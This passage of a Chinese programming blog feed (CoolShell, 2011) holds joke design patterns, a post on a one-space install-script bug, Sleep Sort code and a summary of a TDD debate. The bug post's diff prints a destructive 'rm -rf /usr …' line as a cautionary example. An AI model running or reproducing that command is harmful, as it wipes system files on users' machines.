<span class="ez-toc-section" id="310_Tempest_Method_%E6%9A%B4%E9%A3%8E%E9%9B%A8%E6%A8%A1%E5%BC%8F_Template_Method_%E6%A8%A1%E6%9D%BF%E6%96%B9%E6%B3%95"></span><strong>3.10 Tempest Method 暴风雨模式| <span style="color: #999999;">Template Method 模板方法</span></strong><span class="ez-toc-section-end"></span>
</h5>
<p style="text-align: justify;">Tempest Method 主要用在软件快要发布的最后几天。这个模式的物征是，代码中没有注释，并有使用了好几个Detonator Pattern 地雷模式。</p>
<h5>
<span class="ez-toc-section" id="311_Visitor_From_Hell_%E5%9C%B0%E7%8B%B1%E8%AE%BF%E9%97%AE%E8%80%85%E6%A8%A1%E5%BC%8F_Visitor_%E8%AE%BF%E9%97%AE%E8%80%85%E6%A8%A1%E5%BC%8F"></span><strong>3.11 Visitor From Hell 地狱访问者模式 | <span style="color: #999999;">Visitor 访问者模式</span></strong><span class="ez-toc-section-end"></span>
</h5>
<p style="text-align: justify;">Visitor From Hell 模式一般是在运行时没有检查数组越界的一个巧合。这样一来，我们系统就可以实现Visitor From Hell 模式，因为这样可以造成重要数据的重写。</p>
<h4 style="text-align: left;">
<span class="ez-toc-section" id="%E5%8F%82%E8%80%83"></span><span style="font-size: x-small;">参考</span><span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>
<span style="font-size: x-small;">[1] Gamma, E., Helm, R., Johnson, R., Vlissides, J., Design Patterns – </span><span style="font-size: x-small;">Elements of Reusable Object-Oriented Software. Addison-Wesley, 1995.</span>
</li>
</ul>
<ul>
<li>
<span style="font-size: x-small;">[2] Michael Duell is an Engineer at AG Communication Systems, where his </span><span style="font-size: x-small;">Resign Patterns have been rejected in favor of the Gang </span><span style="font-size: x-small;">of Four Design Patterns.</span>
</li>
</ul>
<ul>
<li>
<span style="font-size: x-small;">[3] “Resign Patterns: Ailments of Unsuitable Project-Disoriented Software,” </span><span style="font-size: x-small;">The Software Practitioner, Vol. 7, No. 3, May-June 1997, p. 14.</span>
</li>
</ul>
<p style="text-align: left;"><span style="font-size: x-small;"> </span></p>
<p style="text-align: left;"><span style="font-size: x-small;"> </span></p>
<div style="text-align: left;"><span style="font-size: x-small;">（全文完）</span></div>
<p></p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/9949.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/9949.html" class="wp_rp_title">IoC/DIP其实是一种管理思想</a>
</li>
<li>
<a href="https://coolshell.cn/articles/21589.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/21589.html" class="wp_rp_title">如何做一个有质量的技术分享</a>
</li>
<li>
<a href="https://coolshell.cn/articles/20977.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20977.html" class="wp_rp_title">程序员如何把控自己的职业</a>
</li>
<li>
<a href="https://coolshell.cn/articles/20765.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20765.html" class="wp_rp_title">MegaEase的远程工作文化</a>
</li>
<li>
<a href="https://coolshell.cn/articles/20276.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20276.html" class="wp_rp_title">别让自己“墙”了自己</a>
</li>
<li>
<a href="https://coolshell.cn/articles/19612.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/19612.html" class="wp_rp_title">50年前的登月程序和程序员有多硬核</a>
</li>
</ul>
</div></div>
<div id="post-ratings-4844" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="02f8d65a09">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>17</strong> 人打了分，平均分： <strong>4.18</strong> )<br><span class="post-ratings-text" id="ratings_4844_text"></span><meta itemprop="name" content="“另类” 设计模式">
<meta itemprop="headline" content="“另类” 设计模式">
<meta itemprop="description" content="下面这篇文章来自这里：http://www.lsd.ic.unicamp.br/~oliva/fun/prog/resign-patterns，这篇文章有点意思了，山寨了我们著名的Design Pattern。这篇文章并不是很容易翻译，也许我翻译的不好，大家多指正。另外，这篇文章将失去原有的趣味在于其使用了经典设计模式的单词很相似的单词，一走眼你还以为是正二八经的设计模式。呵呵。所以，我在下文中，...">
<meta itemprop="datePublished" content="2011-06-16T08:46:28+08:00">
<meta itemprop="dateModified" content="2011-06-16T01:22:24+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/4844.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/4844.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.18">
<meta itemprop="ratingCount" content="17">
</div>
</div>
<div id="post-ratings-4844-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-06-16T08:46:28+08:00</pubDate>
<guid>https://coolshell.cn/articles/4844.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 一个空格引发的惨剧 ]]></title>
<link>https://coolshell.cn/articles/4875.html</link>
<content><![CDATA[ 
<p>你是否相信如果你的程序里没有检查一个变量会导致怎么系统瘫痪？无论你相不相信，这是我一个亲身经历过的案例，你可以在本站的<a title="程序员那些悲催的事儿" href="https://coolshell.cn/articles/3980.html" target="_blank">程序员那些悲催的事儿</a>中找到很多这样的事。这样的事昨天在发生，今天同样在发生。<a title="Unix传奇(上篇)" href="https://coolshell.cn/articles/2322.html" target="_blank">Unix40多年</a>了，在这40年里，程序员发生过各种各样的的惨剧，但是大多数的事情一而再再而三的重演。</p>
<p>今天的你，可能在开发者各种各样NB的系统，你会相信你的一个空格也能导致系统瘫痪吗？也许你可能很难相信这个事。不过，再下面这个事将告诉你这个血淋淋的事实 —— 一个空格产生的bug可以让你的系统瘫痪。</p>
<p><a href="https://github.com/MrMEEE/bumblebee">bumblebee</a>是一个开源项目，这个名字也就是变形金刚里的大黄蜂，这个项目是这样介绍自己的——</p>
<blockquote><p>bumblebee is Optimus support for Linux, with real offloading, and not switchable graphics.. More important.. it works on Optimus Laptops without a graphical multiplexer..</p></blockquote>
<p>Optimus 是NVIDIA的“优驰”技术，其可以将您的笔记本电脑PC提升到绝佳状态，提供出色的图形性能，并在需要时延长电池续航时间。这个项目是把这个技术移到Linux上来。</p>
<p>这个项目本来不出名，不过，程序在其安装脚本install.sh里的一个bug让这个项目一下子成了全世界最瞩目的项目，这个bug的fix如下：</p>
<p></p>
<pre data-enlighter-language="diff" class="EnlighterJSRAW">@@ -348,7 +348,7 @@ case "$DISTRO" in
-  rm -rf /usr /lib/nvidia-current/xorg/xorg
+  rm -rf /usr/lib/nvidia-current/xorg/xorg</pre>
<p>看明白了吗？<strong>空格</strong>。这个空格会导致什么样的问题呢？呵呵。你有没有感到菊花一紧？这个bug绝对的霸气外露！真是验证了<a title="如何写出无法维护的代码" href="https://coolshell.cn/articles/4758.html" target="_blank">“如何写出无法维护代码</a>”的那句话——“<strong>测试你的程序是一种懦夫的行为</strong>”。</p>
<p>不过，最精彩还不是这个bug，而是全世界程序员的对这个bug 的 code review comments，真的相当的欢乐。请强势围望！</p>
<p><span id="more-4875"></span></p>
<p style="text-align: center;"><a href="https://github.com/MrMEEE/bumblebee/commit/a047be85247755cdbe0acce6#diff-1">https://github.com/MrMEEE/bumblebee/commit/a047be85247755cdbe0acce6#diff-1</a></p>
<p style="text-align: left;">重点是其中的很多图片——下面的图片众多。</p>
<p style="text-align: center;"><a href="http://pic003.cnblogs.com/2011/34358/201106/20110620115950761.gif"><img alt="image placeholder" ></a></p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: center;"><a href="http://pic003.cnblogs.com/2011/34358/201106/20110620115950761.gif"><br>
</a></p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: center;"><a href="http://pic003.cnblogs.com/2011/34358/201106/20110620115951580.jpg"><img alt="image placeholder" ></a></p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: center;"><a href="http://pic003.cnblogs.com/2011/34358/201106/20110620115954514.jpg"><img alt="image placeholder" ></a></p>
<p style="text-align: center;"><a href="http://pic003.cnblogs.com/2011/34358/201106/20110620115958341.jpg"><img alt="image placeholder" ></a></p>
<p style="text-align: center;"><a href="http://pic003.cnblogs.com/2011/34358/201106/20110620115958163.jpg"><img alt="image placeholder" ></a></p>
<p style="text-align: center;"><a href="http://pic003.cnblogs.com/2011/34358/201106/20110620115959641.jpg"><img alt="image placeholder" ></a></p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: center;"><a href="http://pic003.cnblogs.com/2011/34358/201106/20110620120001777.gif"><img alt="image placeholder" ></a></p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: center;"><a href="http://pic003.cnblogs.com/2011/34358/201106/20110620120002899.jpg"><img alt="image placeholder" ></a></p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: center;"><a href="http://pic003.cnblogs.com/2011/34358/201106/20110620120002666.jpg"><img alt="image placeholder" ></a></p>
<p style="text-align: center;"><a href="http://pic003.cnblogs.com/2011/34358/201106/20110620120003129.jpg"><img alt="image placeholder" ></a></p>
<p style="text-align: center;"><a href="http://pic003.cnblogs.com/2011/34358/201106/2011062012000453.jpg"><img alt="image placeholder" ></a></p>
<p><img alt="image placeholder" ></p>
<p style="text-align: left;">(全文完)</p>
<p></p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/18024.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18024.html" class="wp_rp_title">API设计原则 – Qt官网的设计实践总结</a>
</li>
<li>
<a href="https://coolshell.cn/articles/11432.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/11432.html" class="wp_rp_title">从Code Review 谈如何做技术</a>
</li>
<li>
<a href="https://coolshell.cn/articles/5444.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/5444.html" class="wp_rp_title">千万不要把 bool 设计成函数参数</a>
</li>
<li>
<a href="https://coolshell.cn/articles/5201.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/5201.html" class="wp_rp_title">重构代码的7个阶段</a>
</li>
<li>
<a href="https://coolshell.cn/articles/4758.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4758.html" class="wp_rp_title">如何写出无法维护的代码</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3005.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3005.html" class="wp_rp_title">代码重构的一个示例</a>
</li>
</ul>
</div></div>
<div id="post-ratings-4875" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="e6ce6dc282">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>25</strong> 人打了分，平均分： <strong>4.08</strong> )<br><span class="post-ratings-text" id="ratings_4875_text"></span><meta itemprop="name" content="一个空格引发的惨剧">
<meta itemprop="headline" content="一个空格引发的惨剧">
<meta itemprop="description" content="你是否相信如果你的程序里没有检查一个变量会导致怎么系统瘫痪？无论你相不相信，这是我一个亲身经历过的案例，你可以在本站的程序员那些悲催的事儿中找到很多这样的事。这样的事昨天在发生，今天同样在发生。Unix40多年了，在这40年里，程序员发生过各种各样的的惨剧，但是大多数的事情一而再再而三的重演。

今天的你，可能在开发者各种各样NB的系统，你会相信你的一个空格也能导致系统瘫痪吗？也许你可能很难相...">
<meta itemprop="datePublished" content="2011-06-20T08:26:34+08:00">
<meta itemprop="dateModified" content="2012-07-03T12:29:47+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/4875.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/4875.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.08">
<meta itemprop="ratingCount" content="25">
</div>
</div>
<div id="post-ratings-4875-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-06-20T08:26:34+08:00</pubDate>
<guid>https://coolshell.cn/articles/4875.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 排序算法 Sleep Sort ]]></title>
<link>https://coolshell.cn/articles/4883.html</link>
<content><![CDATA[ 
<p>排序算法好像是程序员学习编程最多的算法，也可能是算法研究者们最喜欢研究的算法了。排序有很多很多的算法，比如，冒泡，插入，选择，堆，快速，归并等等（你可以看看本站以前的那些文章：<a title="可视化的排序过程" href="https://coolshell.cn/articles/3933.html" target="_blank">可视化的排序</a>，<a title="一个排序算法比较的网站" href="https://coolshell.cn/articles/399.html" target="_blank">排序算法比较</a>，<a title="一个显示排序过程的Python脚本" href="https://coolshell.cn/articles/536.html" target="_blank">显示排序过程的python</a>）这里向大家介绍一个“巨NB”的排序算法——Sleep Sort。</p>
<p>闲言少说，请看下面的代码（用Shell脚本写的）</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">#!/bin/bash
function f() {
    sleep "$1"
    echo "$1"
}
while [ -n "$1" ]
do
    f "$1" &amp;
    shift
done
wait</pre>
<p>用法如下：</p>
<p style="padding-left: 30px;">./sleepsort.bash 5 3 6 3 6 3 1 4 7</p>
<p>相信你可以会去试一下这个脚本，也相你你试完后你一定会说——“<strong>我擦，真TMD排序了！</strong>”，我还是不要解释这段代码了，过多的解释会不如代码那么直接，而且解释会影响你对这个排序算法的NB性。只想说——<strong>这是正二八经的多线程、多进程排序啊</strong>。我们的<a title="可视化的排序过程" href="https://coolshell.cn/articles/3933.html" target="_blank">Bogo排序</a>也黯然失色啊。</p>
<p>下面我们需要对这个算法做一些分析——</p>
<p><span id="more-4883"></span>1）让我们来分析一个这这个程序的算法复杂度，太简单了，不就是O(最大数的秒数)，呵呵。所以，如果出现这样的数列将是恶梦的——2 1 4 3 2 1 99999999</p>
<p>2）这个排序好是好，但对于负数或浮点数就有bug了。负数的解决方案是，我们可以这样来：x/2+MaxInt/2（时间可能相当长，不过依然工作）。对于浮点数，看看下面的代码.</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">#!/bin/bash
function f() {
  sleep $(echo "($2 - 1) + $1 / 10 ^ $2" | bc -l)
  echo "$1"
}
while [ -n "$1" ]
do
  f "$1" $(echo -n "$1" | wc -c) &amp;
  shift
done
wait</pre>
<p>3）我们来看看各种语言版本的实现吧。<br>
<strong>Java</strong></p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">public class SleepSort {
    public static void main(String[] args) {
        int[] ints = {1,4,7,3,8,9,2,6,5};
        SortThread[] sortThreads = new SortThread[ints.length];
        for (int i = 0; i &lt; sortThreads.length; i++) {
            sortThreads[i] = new SortThread(ints[i]);
        }
        for (int i = 0; i &lt; sortThreads.length; i++) {
            sortThreads[i].start();
        }
    }
}
class SortThread extends Thread{
    int ms = 0;
    public SortThread(int ms){
        this.ms = ms;
    }
    public void run(){
        try {
            sleep(ms*10+10);
        } catch (InterruptedException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
        System.out.println(ms);
    }
}</pre>
<p><strong>Javascript</strong></p>
<p>[javascript]function sleepsort() {<br>
for (var i = 0, il = arguments.length; i &lt; il; i++) {<br>
(function(args, index) {<br>
setTimeout(function() {<br>
document.body.innerHTML += args[index] + ‘, ‘;<br>
}, args[index]);<br>
}(arguments, i));<br>
}<br>
};<br>
[/javascript]</p>
<p><strong>Brainfuck </strong>(关于这门语言，请<a title="BT雷人的程序语言（大全）" href="https://coolshell.cn/articles/4458.html" target="_blank">参看这篇文章</a>)</p>
<p><code>,&gt;,&gt;++++++++[&lt;------&lt;------&gt;&gt;-]<br>
&lt;&lt;[&gt;[&gt;+&gt;+&lt;&lt;-]&gt;&gt;[&lt;&lt;+,&gt;,&gt;++++++++[&lt;------&lt;------&gt;&gt;-]<br>
&lt;&lt;[ ----------[++++++++++&gt;----------]++++++++++<br>
&gt;[&gt;+&gt;+&lt;&lt;-]&gt;&gt;[&lt;&lt;+&gt;&gt;-]&lt;&lt;&lt;-] &gt;&gt;&gt;++++++[&lt;++++++++&gt;-]&lt;.&gt;.&gt;&gt;-]&lt;&lt;&lt;-]<br>
,----------[----------------------.,----------]<br>
,---&lt;&lt;&lt;+&gt;&gt;&gt;-------[----------------------.,----------]<br>
&gt;&gt; ----------[++++++++++&gt;----------]++++++++++<br>
&gt;++++++[&lt;++++++++&gt;-]&lt; ----------[++++++++++&gt;----------]++++++++++<br>
.&gt;. ----------[++++++++++&gt;----------]++++++++++<br>
&gt;++&gt;+&lt;&lt;-]&gt;&gt;[&lt;&lt;+&gt;&gt;-]&lt;&lt;&lt;-] &gt;&gt;[&gt;[&gt;+&gt;+&lt;&lt;-]&gt;&gt;[&lt;&lt;----------[++++++++++&gt;----------]++++++++++<br>
&gt;++,&gt;,&gt;++++++++[&lt;------&lt;------&gt;&gt;-]<br>
&lt;&lt;</code></p>
<p>（全文完）</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/17225.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/17225.html" class="wp_rp_title">Cuckoo Filter：设计与实现</a>
</li>
<li>
<a href="https://coolshell.cn/articles/12052.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/12052.html" class="wp_rp_title">Leetcode 编程训练</a>
</li>
<li>
<a href="https://coolshell.cn/articles/11847.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/11847.html" class="wp_rp_title">谜题的答案和活动的心得体会</a>
</li>
<li>
<a href="https://coolshell.cn/articles/11832.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/11832.html" class="wp_rp_title">【活动】解迷题送礼物</a>
</li>
<li>
<a href="https://coolshell.cn/articles/10590.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/10590.html" class="wp_rp_title">二维码的生成细节和原理</a>
</li>
<li>
<a href="https://coolshell.cn/articles/10427.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/10427.html" class="wp_rp_title">伙伴分配器的一个极简实现</a>
</li>
</ul>
</div></div>
<div id="post-ratings-4883" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="71a1300cee">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>22</strong> 人打了分，平均分： <strong>4.14</strong> )<br><span class="post-ratings-text" id="ratings_4883_text"></span><meta itemprop="name" content="排序算法 Sleep Sort">
<meta itemprop="headline" content="排序算法 Sleep Sort">
<meta itemprop="description" content="排序算法好像是程序员学习编程最多的算法，也可能是算法研究者们最喜欢研究的算法了。排序有很多很多的算法，比如，冒泡，插入，选择，堆，快速，归并等等（你可以看看本站以前的那些文章：可视化的排序，排序算法比较，显示排序过程的python）这里向大家介绍一个“巨NB”的排序算法——Sleep Sort。

闲言少说，请看下面的代码（用Shell脚本写的）

[shell]#!/bin/bash
...">
<meta itemprop="datePublished" content="2011-06-23T08:43:18+08:00">
<meta itemprop="dateModified" content="2011-06-22T19:10:01+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/4883.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/4883.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.14">
<meta itemprop="ratingCount" content="22">
</div>
</div>
<div id="post-ratings-4883-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-06-23T08:43:18+08:00</pubDate>
<guid>https://coolshell.cn/articles/4883.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Bob大叔和Jim Coplien对TDD的论战 ]]></title>
<link>https://coolshell.cn/articles/4891.html</link>
<content><![CDATA[ 
<p>今年春节时，我写了一篇《<a title="TDD并不是看上去的那么美" href="https://coolshell.cn/articles/3649.html" target="_blank">TDD并不是看上去的那么美</a>》，在这篇文章中我列举了一些关于使用TDD的一些难点和对TDD的质疑，后来出现了一些争论（可参见那篇文章的评论），以及Todd同学的《<a title="[转]TDD到底美还是不美？" href="https://coolshell.cn/articles/3766.html" target="_blank">TDD到底美不美</a>》，还有infoQ中文上的那个<a title="虚拟座谈会：TDD有多美？" href="http://www.infoq.com/cn/articles/virtual-panel-tdd" target="_blank">几乎没有营养离线讨论</a>。今天，有网友给我推来一个英文版infoQ的视频——“<a title="Coplien and Martin Debate TDD, CDD and Professionalism" href="http://www.infoq.com/interviews/coplien-martin-tdd" target="_blank">Coplien and Martin Debate TDD, CDD and Professionalism</a>”，这是2008年2月18日的视频，视频的主角两个人争论TDD好还是不好，一个是敏捷社区的教主级的人物——Robert Martin（大家称之为“Bob大叔”），另一个是C++，OO，多范式编程的大师<a href="https://en.wikipedia.org/wiki/Jim_Coplien" target="_blank">Jim Coplien</a>（大家都叫他Cope）。这两个人对TDD的见解有分歧。Coplien的很多观点和我之前的不谋而合，而他自己称他是坚决强烈地站在TDD的对立面上。下面是Jim的原话：</p>
<blockquote><p>I have adopted a very strong position against what particularly the XP community is calling test driven development.</p></blockquote>
<p>InfoQ的视频很多时候相当的不给力，就像有前列腺的患者撒尿一样，半天都挤不出一滴。不过，好在那里有这两个人对话的摘录。在这里，我给大家摘要一下：</p>
<p style="text-align: center;">——————————————————正文分割线————————————————————</p>
<p>Coplien首先让Uncle Bob定义了一下TDD，Uncle Bob说明了他的三个法则：（敏捷的同学一定不陌生）</p>
<ol>
<li>一个测试驱动的程序员，其不会在写出一个测试失败的Unit Test前，去写一句可用在生产线上的代码。（没有测试之前不要写任何功能代码）</li>
<li>在编写用于生产线上代码之前，不写过多的测试失败的Unit Test。（只编写刚好能体现一个失败情况的测试代码）</li>
<li>在现有代码通过Unit Test前，不写更多的用于生产线上的代码。（只编写恰好能通过测试的功能代码）</li>
</ol>
<p>Coplien说他有意见的不是这三个法则，而是因为这个三个法则是孤立说出来的。Coplien说他和一些咨询师或是Scrum Master参与过很多的项目，他们发现这些项目都有两个问题：</p>
<ol>
<li>他们使用TDD的时候，软件没有一个架构或是framework。当然，Kent Beck说——TDD可以驱使你去做架构。但是，<strong>TDD和Unit Test 是一回事吗？</strong>Unit Test是一个伟大的事，尤其是当你去写API和类库的时候。今天XP所说的TDD和UT很不一样。如果你使用TDD来驱动你的软件系统架构，那么，<strong>基本上来说，三个迭代以后，你开发的软件就会crash掉，而且无法再往前开发</strong>。 因为什么？因为连软件团队自己都受不了这三个迭代出来的架构，而且你还会发现，你根本没去去重构。</li>
<li>第二个问题是，TDD这种方法破坏了GUI（图形界面），就算是Kent也说：“<strong>你永远不可以在一个漂亮的界面后面隐藏一个糟糕的架构</strong>”，Coplien强烈地相信软件的架构是通过界面来发出其光芒。他觉得如果没有一个好的软件架构，这个会影响用户的操作。</li>
</ol>
<p>Coplien接着说，如果我们使用Uncle Bob的三条法则，我们也许没有什么问题，<strong>但Coplien想告诉大家另一个非常重要的事，那就是软件架构。并说：“我根本不接受TDD是软件专业化实践的论点”</strong>。</p>
<p><span id="more-4891"></span></p>
<p>Bob大叔说，让我们回到99年，那时的敏捷社区觉得软件架构是无关的，不需要软件架构，只需要做一堆tests，做一堆stories，以及足够快的迭代，这样就可以让那些代码魔幻式地拼装起来，这就是horse shit。对于大多数的敏捷拥护者来说，这的确是愚蠢的。今天你再和Knet说这个事，他也会说那不过是一种说法。</p>
<p>Coplien回应到，实际上，Knet在解释XP的时候，在他的书131页的位置说过，“是的，你得做些前期的架构，但也别把自己搞乱了”。</p>
<p>Bob大叔把话题转回来，继续聊关于架构方面的事，他说软件的架构很重要，他也写很一些关于架构的书，他说他也是一个架构方面的怪才，但是他认为架构自己并不会形成软件的所有的外表。他觉得好的软件架构和设计能力应该出现在若干次迭代之后。他觉得你在架构软件的时候，你会创造一些东西，也会破坏一些东西，并且会在几次迭代中做一些试验性的工作，来尝试一下不同的架构。<strong>在2到3次迭代以后，你可以知道那一种架构是对的，这样，你可以在后面的迭代中进行调整 。因此，他认为架构是需要进化和发展的，而不会因为被可执行的代码所形成，也不会因为你所写的测试而形成</strong>。</p>
<p>Coplien赞同架构进化的观点，而且他相信软件的架构的演变和进化不是因为你写的代码，也不是因为Use Case，也不是告诉你你的软件需求的范围和其中的关系，但是如果你做的方法是以增量式的，以用户驱动式的，而你却在和用户沟通时没有一些前期的业务知识，那么这一定是相当有风险的，并且你一定会把事搞砸的。</p>
<p>Coplien接着说，他在Knet早期提到TDD的时候和Knet时，提到YAGNI（陈皓注：You Aren’t Gonna Need It，XP的一个法则，也就是只做最简单的事）时，Kent说到：“让我们来做一个银行帐户，一个储蓄帐户”，储蓄帐户其实就是对余额进行一些加加减减的事，就像一个计算器一样。Copilen继续解释到，但是如果你要做一个真正的银行系统，你的软件架构根本不可能从一个储蓄帐户的对象（计算器）重构出来。因为储蓄帐户根本就不是一个对象，其是一个流程，后面有一个数据库的查帐索引事务，还有存款保证多和利息，还有一些转帐功能。就算是这样，这也只是用户的功能，你还需要支持税务人员和精算会计师等这些人，<strong>这会让银行系统成为一个错综复杂的软件架构，这绝对不是你可以用迭代干出来的事。当然，Bob大叔是可以的，因为他有40年的银行系统的经验。但是Bob大叔你的这40年可真不敏捷啊</strong>。</p>
